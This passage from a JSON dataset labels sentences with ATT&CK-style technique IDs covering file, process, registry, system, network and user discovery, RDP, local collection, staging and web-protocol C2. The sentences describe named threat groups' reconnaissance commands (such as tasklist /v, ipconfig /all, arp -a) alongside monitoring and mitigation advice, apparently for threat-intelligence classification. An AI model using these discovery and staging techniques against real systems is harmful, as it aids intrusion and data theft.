    "type": "text",
    "text": "Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "APT28 has used Forfiles to locate PDF, Excel, and Word documents during collection.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "DustySky scans the victim for files that contain certain keywords and document types including PDF, DOC, DOCX, XLS, and XLSX, from a list that is obtained from the C2 as a text file.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It can also identify logical drives for the infected machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "(ex: locate all files with a specific extension, name, and/or age)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Gamaredon Group macros can scan for Microsoft Word and Excel files to inject with additional malicious macros.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Gamaredon Group has also used its backdoors to automatically list interesting files (such as Office documents) found on a system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole can list information about files in a directory and recently opened or used documents.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole can also search for specific files by supplied file mask.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It can also change file permissions using cacls.exe.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Several Lazarus Group has conducted word searches on compromised machines to identify specific documents of interest.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group malware can use a common function to identify target files by their extension, and some also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Rising Sun can enumerate information about files from the infected system, including file size, attributes, creation time, last access time, and write time.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Rising Sun can enumerate the compilation timestamp of Windows executable files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Skidmap has checked for the existence of specific files including /usr/sbin/setenforce and /etc/selinux/config.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It also has the ability to monitor the cryptocurrency miner file and process.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Sowbug identified and extracted all Word documents on a server by using a command containing * .doc and *.docx.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Turla surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, the Program Files directory, and Recent.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Turla RPC backdoors have also searched for files matching the lPH*.dll pattern.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "XAgentOSX contains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "XAgentOSX contains the showBackupIosFolder function to check for IOS device backups by running ls -la ~/Library/Application\\ Support/MobileSync/Backup/.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Zebrocy searches for files that are 60mb and less and contain the following extensions: .doc, .docx, .xls, .xlsx, .ppt, .pptx, .exe, .zip, and .rar.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Monitor executed commands and arguments that may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for API calls that may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Monitor newly executed processes that may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may attempt to get information about running processes on a system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Information obtained could be used to gain an understanding of common software/applications running on systems within the network.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "In Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "In Mac and Linux, this is accomplished with the ps command.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may also opt to enumerate processes via /proc.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Aria-body has the ability to enumerate loaded modules for a process..",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "SUNSPOT monitored running processes for instances of MsBuild.exe by hashing the name of each running process and comparing it to the corresponding value 0x53D525.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "It also extracted command-line arguments and individual arguments from the running MsBuild.exe process to identify the directory path of the Orion software Visual Studio solution.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Turla surveys a system upon check-in to discover running processes using the tasklist /v command.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Monitor executed commands and arguments for actions that may attempt to get information about running processes on a system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for API calls may attempt to get information about running processes on a system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly executed processes that may attempt to get information about running processes on a system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "The Registry contains a significant amount of information about the operating system, configuration, software, and security.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Information can easily be queried using the Reg utility, though other means to access the Registry exist.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Some of the information may help adversaries to further their operation within a network.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Another Lazarus Group malware sample checks for the presence of the following Registry key:HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "SILENTTRINITY can use the GetRegValue function to check Registry keys within HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated and HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "It also contains additional modules that can check software AutoRun values and use the Win32 namespace to get values from HKCU, HKLM, HKCR, and HKCC hives.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "TEARDROP checked that HKU\\SOFTWARE\\Microsoft\\CTF existed before decoding its embedded payload.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Monitor executed commands and arguments for actions that may interact with the Windows Registry to gather information about the system, configuration, and installed software.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for API calls (such as RegOpenKeyExA) that may interact with the Windows Registry to gather information about the system, configuration, and installed software.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly executed processes that may interact with the Windows Registry to gather information about the system, configuration, and installed software.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for unexpected process interactions with the Windows Registry ( reads) that may be related to gathering information.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Tools such as Systeminfo can be used to gather detailed system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "APT19 used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim’s machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "APT32 executed shellcode to identify the name of the infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Bankshot gathers system information, network addresses, disk type, disk free space, and the operation system version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Bazar can fingerprint architecture, computer name, and OS version on the compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Bazar can also check if the Russian language is installed on the infected machine and terminate if it is found.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "CaddyWiper can use DsRoleGetPrimaryDomainInformation to determine the role of the infected machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "CaddyWiper can also halt execution if the compromised host is identified as a domain controller.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "JHUHUGIT obtains a build identifier as well as victim hard drive information from Windows registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "OSX_OCEANLOTUS.D collects processor information, memory information, computer name, hardware UUID, serial number, and operating system version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "OSX_OCEANLOTUS.D has used the ioreg command to gather some of this information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Pupy can grab a system’s information including the OS version, architecture,",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Torisma can use GetlogicalDrives to get a bitmask of all drives available on a compromised system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "It can also use GetDriveType to determine if a new drive is a CD-ROM drive.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Zebrocy collects the OS version, computer name and serial number for the storage volume C:.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Monitor executed commands and arguments that may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for API calls that may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "In cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Monitor newly executed processes that may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Several operating system administration utilities exist that can be used to gather this information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Examples include Arp, ipconfig/ifconfig, nbtstat, and route.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "GALLIUM used ipconfig /all to obtain information about the victim network configuration.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Kwampirs collects network adapter and interface information by using the commands ipconfig /all, arp -a and route print.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Turla surveys a system upon check-in to discover network configuration details using the arp -a, nbtstat -n, net config, ipconfig /all, and route commands, as well as NBTscan.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Monitor executed commands and arguments that may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for API calls (such as GetAdaptersInfo() and GetIpNetTable()) that may gather details about the network configuration and settings, such as IP and/or MAC addresses.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for executed processes (such as ipconfig/ifconfig and arp) with arguments that may look for details about the network configuration and settings, such as IP and/or MAC addresses.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may check for Internet connectivity on compromised systems.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "This may be performed during automated discovery and can be accomplished in numerous ways such as using Ping, tracert, and GET requests to websites.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The results may also be used to identify routes, redirectors, and proxy servers.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Monitor executed commands and arguments that may check for Internet connectivity on compromised systems.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for executed processes (such as tracert or ping) that may check for Internet connectivity on compromised systems.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "They may do this, for example, by retrieving account usernames or by using OS Credential Dumping.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Various utilities and commands may acquire this information, including whoami.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "In macOS and Linux, the currently logged in user can be identified with w and who.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "On macOS the dscl . list /Users | grep -v '_' command can also be used to enumerate user accounts.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Environment variables, such as %USERNAME% and $USER, may also be used to access this information.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "APT32 executed shellcode to collect the username on the victim's machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "A Linux version of Derusbi checks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "HAPPYWORK can collect the victim user name.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Remote desktop is a common feature in operating systems.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Audit the Remote Desktop Users group membership regularly.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Remove unnecessary accounts and groups from Remote Desktop Users groups.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Disable the RDP service if it is unnecessary.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Use remote desktop gateways.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Enable firewall rules to block RDP traffic between network security zones within a network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Change GPOs to define shorter timeouts sessions and maximum amount of time any single session can be active.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Change GPOs to specify the maximum amount of time that a disconnected session stays active on the RD session host server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Consider removing the local Administrators group from the list of groups allowed to log in through RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Limit remote user permissions if remote access is necessary.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The adversary may then perform actions as the logged-on user.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The adversary may then perform actions that spawn additional processes as the logged-on user.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP).",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may also use RDP in conjunction with the Accessibility Features or Terminal Services DLL for Persistence.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "APT3 has also interacted with compromised systems to browse and copy files through RDP sessions.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Use multi-factor authentication for remote logins.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Do not leave RDP accessible from the internet.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for user accounts logged into systems associated with RDP (ex: Windows EID 4624 Logon Type 10).",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Other factors, such as access patterns (ex: multiple systems over a relatively short period of time) and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly constructed network connections (typically over port 3389) that may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP).",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor network traffic for uncommon data flows that may use /techniques/T1078 to log into a computer using the Remote Desktop Protocol (RDP).",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly executed processes (such as mstsc.exe) that may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP).",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may also use Automated Collection on the local system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on the local system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Forfiles can be used to act on (ex: copy, move, ) files/directories in a system during (ex: copy files into a staging area before).",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Data loss prevention can restrict access to sensitive data and detect sensitive data that is unencrypted.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Monitor executed commands and arguments that may search and collect local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Remote access tools with built-in features may interact directly with the Windows API to gather data.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for unexpected/abnormal access to files that may be malicious collection of local data, such as user files (pdf, .docx, .jpg, ) or local databases.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for API calls that may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for newly executed processes that may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor executed commands and arguments arguments for actions that could be taken to collect and combine files.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, ) to regularly check for compressed or encrypted data that may be indicative of staging.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Consider monitoring accesses and modifications to local storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "BADNEWS copies documents under 15MB found on the victim system to is the user's %temp%\\SMB\\ folder.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Mustang Panda has stored collected credential files in c:\\windows\\temp prior to exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Mustang Panda has also stored documents for exfiltration in a hidden folder on USB drives.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Pteranodon creates various subdirectories under %Temp%\\reports\\% and copies files to those subdirectories.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "It also creates a folder at C:\\Users\\\\AppData\\Roaming\\Microsoft\\store to store screenshot JPEG files.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Protocols such as HTTP and HTTPS that carry web traffic may be very common in environments.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "HTTP/S packets have many fields and headers in which data can be concealed.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Data is exchanged via HTTP POSTs.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The group has also used downloaded encrypted payloads over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike can use a custom command and control protocol that can be encapsulated in HTTP or HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Kazuar uses HTTP and HTTPS to communicate with the C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "If so, NETEAGLE will send beacons via an HTTP POST request.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
